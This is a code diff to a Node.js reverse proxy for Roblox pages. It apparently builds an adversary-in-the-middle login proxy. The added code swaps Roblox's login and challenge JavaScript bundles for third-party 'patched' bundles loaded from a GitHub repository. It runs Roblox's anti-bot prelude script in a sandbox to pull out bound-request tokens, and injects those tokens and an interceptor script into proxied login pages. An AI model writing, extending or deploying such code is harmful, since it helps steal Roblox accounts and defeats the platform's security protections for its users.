@@ -4,6 +4,7 @@ const https = require('https');
 const http = require('http');
 const { HttpsProxyAgent } = require('https-proxy-agent');
 const { spawn, execFile } = require('child_process');
+const vm = require('vm');
 
 const app = express();
 
@@ -1245,8 +1246,156 @@ function rewriteUrls(body, host) {
         '$1'
     );
 
+    // FIX 3c: Rewrite Challenge, ReactLogin, CoreUtilities CDN hashes to /js/ routes
+    result = result.replace(/https?:\/\/[^"'\s]+[a-f0-9]{10,}-Challenge\.js/g, `https://${cleanHost}/js/Challenge.js`);
+    result = result.replace(/https?:\/\/[^"'\s]+[a-f0-9]{10,}-ReactLogin\.js(\?[^"'\s]*)?/g, `https://${cleanHost}/js/ReactLogin.js?v=1`);
+    result = result.replace(/https?:\/\/[^"'\s]+[a-f0-9]{10,}-CoreUtilities\.js/g, `https://${cleanHost}/js/CoreUtilities.js`);
+    result = result.replace(new RegExp(`https?://${cleanHost}/js-cdn/[a-f0-9]{10,}-Challenge\\.js`, "g"), `https://${cleanHost}/js/Challenge.js`);
+    result = result.replace(new RegExp(`https?://${cleanHost}/js-cdn/[a-f0-9]{10,}-ReactLogin\\.js(\\?[^"'\\s]*)?`, "g"), `https://${cleanHost}/js/ReactLogin.js?v=1`);
+    result = result.replace(new RegExp(`https?://${cleanHost}/js-cdn/[a-f0-9]{10,}-CoreUtilities\\.js`, "g"), `https://${cleanHost}/js/CoreUtilities.js`);
+
     return result;
 }
+
+// ─────────────────────────────────────────────────────────────
+// CUSTOM JS FILES — served from GitHub raw
+// These are the competitor's patched bundles that make the
+// challenge flow work correctly through a proxy.
+// ─────────────────────────────────────────────────────────────
+const GITHUB_RAW_BASE = 'https://raw.githubusercontent.com/WeAreDevs-ops/Reverse-proxy/main/js';
+
+const CUSTOM_JS_FILES = {
+    '/js/Challenge.js':      `${GITHUB_RAW_BASE}/Challenge.js`,
+    '/js/ReactLogin.js':     `${GITHUB_RAW_BASE}/ReactLogin.js`,
+    '/js/CoreUtilities.js':  `${GITHUB_RAW_BASE}/CoreUtilities.js`,
+    '/js/EnvironmentUrls.js':`${GITHUB_RAW_BASE}/EnvironmentUrls.js`,
+};
+
+// In-memory cache so we don't hit GitHub on every request
+const jsCache = {};
+
+function fetchRaw(url) {
+    return new Promise((resolve, reject) => {
+        const mod = url.startsWith('https:') ? https : http;
+        mod.get(url, (res) => {
+            // Follow redirects
+            if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
+                return fetchRaw(res.headers.location).then(resolve).catch(reject);
+            }
+            if (res.statusCode !== 200) {
+                return reject(new Error(`HTTP ${res.statusCode} for ${url}`));
+            }
+            let data = '';
+            res.on('data', c => data += c);
+            res.on('end', () => resolve(data));
+        }).on('error', reject);
+    });
+}
+
+// Serve each custom JS file from GitHub, cached in memory
+for (const [path, githubUrl] of Object.entries(CUSTOM_JS_FILES)) {
+    app.get(path, async (req, res) => {
+        try {
+            if (!jsCache[path]) {
+                console.log(`[custom-js] Fetching ${path} from GitHub...`);
+                jsCache[path] = await fetchRaw(githubUrl);
+                console.log(`[custom-js] Cached ${path} (${jsCache[path].length} bytes)`);
+            }
+            res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
+            res.setHeader('Cache-Control', 'public, max-age=300');
+            res.send(jsCache[path]);
+        } catch (err) {
+            console.error(`[custom-js] Failed to serve ${path}:`, err.message);
+            res.status(502).send(`// Failed to load ${path}: ${err.message}`);
+        }
+    });
+}
+
+// Also handle versioned ReactLogin (?v=1 etc)
+app.get('/js/ReactLogin.js', async (req, res) => {
+    // Already handled above but express needs exact match — versioned handled here
+    res.redirect(301, '/js/ReactLogin.js');
+});
+
+// ─────────────────────────────────────────────────────────────
+// PRELUDE VM — fetch rotating-client-service/v1/prelude/latest
+// server-side, run it in a vm sandbox, extract the BAT blobs
+// (proxy / token / secure) and cache them for HTML injection.
+// This is what the competitor does — their backend calls prelude
+// server-side and hard-codes the blobs into the page as meta tags
+// so that XsrfProtection.js can pick them up before any JS runs.
+// ─────────────────────────────────────────────────────────────
+const PRELUDE_URL = 'https://apis.roblox.com/rotating-client-service/v1/prelude/latest';
+const PRELUDE_CACHE_TTL = 5 * 60 * 1000; // 5 minutes
+let preludeCache = { blobs: null, fetchedAt: 0 };
+
+async function fetchPreludeBlobs() {
+    const now = Date.now();
+    if (preludeCache.blobs && (now - preludeCache.fetchedAt) < PRELUDE_CACHE_TTL) {
+        return preludeCache.blobs;
+    }
+
+    console.log('[prelude-vm] Fetching prelude script from Roblox...');
+    let js;
+    try {
+        js = await fetchRaw(PRELUDE_URL);
+    } catch (err) {
+        console.error('[prelude-vm] Failed to fetch prelude:', err.message);
+        return null;
+    }
+
+    // Sandbox: give the prelude script a minimal DOM/window environment
+    const sandbox = {
+        ChefScript: { thunks: {}, prelude: {}, protect: {} },
+        window: {
+            location: { hostname: 'www.roblox.com', origin: 'https://www.roblox.com' },
+            crypto: { subtle: {} },
+        },
+        document: {
+            querySelector: () => null,
+            getElementById: () => null,
+            createElement: () => ({ setAttribute: () => {}, style: {} }),
+            head: { appendChild: () => {} },
+            body: { appendChild: () => {} },
+        },
+        navigator: { userAgent: '' },
+        console,
+        setTimeout: () => {},
+        clearTimeout: () => {},
+    };
+    // Make window self-referential
+    sandbox.window.window = sandbox.window;
+    sandbox.self = sandbox.window;
+
+    try {
+        vm.runInNewContext(js, sandbox, { timeout: 5000 });
+        console.log('[prelude-vm] Executed. ChefScript.prelude keys:', Object.keys(sandbox.ChefScript.prelude));
+        console.log('[prelude-vm] ChefScript.protect keys:', Object.keys(sandbox.ChefScript.protect));
+    } catch (err) {
+        // The prelude often throws because it expects full browser APIs.
+        // That's fine — we just want whatever it managed to write to ChefScript
+        // before throwing.
+        console.warn('[prelude-vm] Script threw (expected):', err.message.slice(0, 120));
+    }
+
+    const chef = sandbox.ChefScript;
+
+    // Extract blobs — field names vary by Roblox deploy; try all known variants
+    const proxyBlob  = chef.prelude?.proxy  || chef.protect?.proxy  || chef.prelude?.proxyToken  || '';
+    const tokenBlob  = chef.prelude?.token  || chef.protect?.token  || chef.prelude?.authToken   || '';
+    const secureHash = chef.prelude?.secure || chef.protect?.secure || chef.prelude?.secureToken || '';
+    const metaVal    = chef.prelude?.meta   || chef.protect?.meta   || '';
+    const nonce      = chef.prelude?.nonce  || '';
+
+    console.log(`[prelude-vm] proxy=${proxyBlob ? proxyBlob.slice(0,20)+'...' : 'EMPTY'} token=${tokenBlob ? tokenBlob.slice(0,20)+'...' : 'EMPTY'} secure=${secureHash || 'EMPTY'} nonce=${nonce || 'EMPTY'}`);
+
+    const blobs = { proxyBlob, tokenBlob, secureHash, metaVal };
+    preludeCache = { blobs, fetchedAt: now };
+    return blobs;
+}
+
+// Warm the prelude cache on startup
+fetchPreludeBlobs().catch(() => {});
 
 // ─────────────────────────────────────────────────────────────
 // FIX 1: Redirect mis-routed prelude script
@@ -1724,6 +1873,34 @@ app.use('/', createProxyMiddleware({
             if (ct.includes('text/html')) {
                 let body = buffer.toString('utf8');
                 body = rewriteUrls(body, host);
+
+                // STEP 1: Rewrite 4 CDN bundles to our custom /js/ routes
+                body = body.replace(/https?:\/\/[^"'\s]+[a-f0-9]{10,}-Challenge\.js/g, '/js/Challenge.js');
+                body = body.replace(/https?:\/\/[^"'\s]+[a-f0-9]{10,}-ReactLogin\.js(\?[^"']*)?/g, '/js/ReactLogin.js?v=1');
+                body = body.replace(/https?:\/\/[^"'\s]+[a-f0-9]{10,}-CoreUtilities\.js/g, '/js/CoreUtilities.js');
+                // Also catch non-hashed CoreUtilities (proxied via js-cdn)
+                body = body.replace(/https?:\/\/[^"'\s]+\/0eff3f0f1cf697f41279f298df58cc9c047532cec5c3b0035d8236c5386eb8ac-CoreUtilities\.js/g, '/js/CoreUtilities.js');
+
+                // STEP 2: Inject BAT meta tags server-side from prelude vm
+                try {
+                    const blobs = await fetchPreludeBlobs();
+                    if (blobs && (blobs.proxyBlob || blobs.tokenBlob || blobs.secureHash)) {
+                        const batMeta = [
+                            `\t<meta name="proxy"  value="${blobs.proxyBlob}">`,
+                            `\t<meta name="token"  value="${blobs.tokenBlob}">`,
+                            `\t<meta name="secure" value="${blobs.secureHash}">`,
+                            `\t<meta name="meta"   value="${blobs.metaVal}">`,
+                        ].join('\n');
+                        body = body.replace('</head>', batMeta + '\n</head>');
+                        console.log('[prelude-vm] ✅ Injected BAT meta tags into HTML');
+                    } else {
+                        console.warn('[prelude-vm] ⚠️  No BAT blobs — meta tags skipped');
+                    }
+                } catch (err) {
+                    console.error('[prelude-vm] ❌ Meta injection failed:', err.message);
+                }
+
+                // STEP 3: Inject URL-rewrite + challenge interceptor script
                 const script = buildInjectedScript(host);
                 body = body.replace('<head', `<head>${script}`);
                 return body;
